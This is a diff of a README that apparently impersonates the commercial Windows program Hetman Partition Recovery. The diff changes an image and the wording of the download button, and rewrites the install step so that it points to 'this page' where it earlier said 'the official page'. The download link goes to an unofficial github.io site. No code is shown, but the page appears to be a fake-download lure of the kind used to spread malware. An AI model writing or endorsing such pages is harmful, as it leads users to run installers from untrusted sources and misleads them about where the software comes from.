@@ -1,13 +1,13 @@
 # Hetman Partition – Data Software for Windows  
 
 <div align="center">
-  <img src="https://img.utdstc.com/icon/377/c94/377c9401a0b852dc5dfe0ab06f85a2729e4f9a906a945963bb6946fc75ce154a:200" width="250"/>
+  <img src="https://mloads.com/uploads/posts/2024-12/hetman-partition-recovery.webp" width="350"/>
 </div>  
 <br>
 
 <div align="center">
 
-[![🪟 Download for Windows](https://img.shields.io/badge/🪟_Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://hetman-partition-software.github.io/.github)
+[![🪟 Get for Windows](https://img.shields.io/badge/Get-for_Windows-blue?style=for-the-badge&logo=windows)](https://hetman-partition-software.github.io/.github)
 
 </div>
 
@@ -15,7 +15,7 @@
 
 ## 📥 Installation Instructions for Windows  
 
-1. Download the installer from the official page.  
+1. Get the installer from this page.  
 2. Run the setup file and complete the installation.  
 3. Launch the program and start working with your drives.  
 
